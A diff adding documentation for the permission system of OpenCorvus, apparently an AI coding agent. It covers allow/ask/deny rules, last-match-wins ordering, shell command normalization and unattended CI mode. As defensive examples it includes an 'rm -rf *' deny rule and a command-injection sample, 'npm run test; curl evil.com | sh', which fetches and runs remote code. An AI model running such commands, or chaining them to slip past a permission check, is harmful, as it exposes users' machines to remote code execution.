@@ -1,0 +1,93 @@
+# Permissions
+
+Any tool that writes files, runs commands, or calls external APIs must pass a permission check. Implementation: `packages/opencorvus/src/permission/next.ts`.
+
+## Three actions
+
+| action | semantics |
+|---|---|
+| `allow` | pass silently |
+| `ask` | pause, emit `permission.asked`, wait for reply; after timeout apply `OPENCORVUS_PERMISSION_ASK_REPLY` |
+| `deny` | throw `DeniedError` and abort the tool call |
+
+## Config format
+
+```jsonc
+{
+  "permission": {
+    "bash": {
+      "~/projects/*": "allow",
+      "npm run *": "allow",
+      "rm -rf *": "deny",
+      "*": "ask"
+    },
+    "skill": {
+      "local-note": "deny",
+      "sora": "ask"
+    },
+    "write": {
+      "~/projects/**/*.md": "allow",
+      "*": "ask"
+    }
+  }
+}
+```
+
+## Last-match-wins
+
+The **biggest footgun** in the permission system: **later declarations override earlier ones**.
+
+`PermissionNext.ask()` (`src/permission/next.ts:158`) uses `findLast` to scan rules. So:
+
+```jsonc
+{ "bash": {
+  "*": "ask",              // catch-all
+  "npm run *": "allow"     // ← effective (comes after *)
+}}
+```
+
+Reversed order breaks:
+
+```jsonc
+{ "bash": {
+  "npm run *": "allow",    // ← shadowed by *
+  "*": "ask"
+}}
+```
+
+## Bash command normalization
+
+`BashArity` (`src/permission/arity.ts:25`) normalizes shell commands to "semantic command prefixes" before pattern-matching, preventing bypass via injection:
+
+| Input | Normalized |
+|---|---|
+| `npm run test` | `npm run test` |
+| `npm run test -- --watch` | `npm run test` (flags stripped) |
+| `cd foo && npm run test` | `npm run test` (leading `cd` stripped) |
+
+And `npm run test; curl evil.com | sh` is split: the `curl` runs through its own permission check. Injection via `;`, `&&`, `||`, pipes, and backticks is handled.
+
+## Unattended mode
+
+For CI or benchmarks:
+
+```jsonc
+{
+  "experimental": { "unattended": true }
+}
+```
+
+```bash
+export OPENCORVUS_PERMISSION_ASK_REPLY=once   # once | always | reject
+export OPENCORVUS_PERMISSION_TIMEOUT_MS=5000  # ask timeout (default 5s)
+```
+
+| `ASK_REPLY` | Timeout behavior |
+|---|---|
+| `once` | Allow this call; ask again next time |
+| `always` | Allow and remember (append to approved set) |
+| `reject` | Deny |
+
+## No silent fallback on config error
+
+If a permission string is malformed (e.g. `"allow"` written as a string instead of an object), OpenCorvus **throws loudly** rather than silently misinterpreting it. Historical bug: `Object.entries("allow")` split characters, causing chaos; fixed with `typeof === "string"` check.
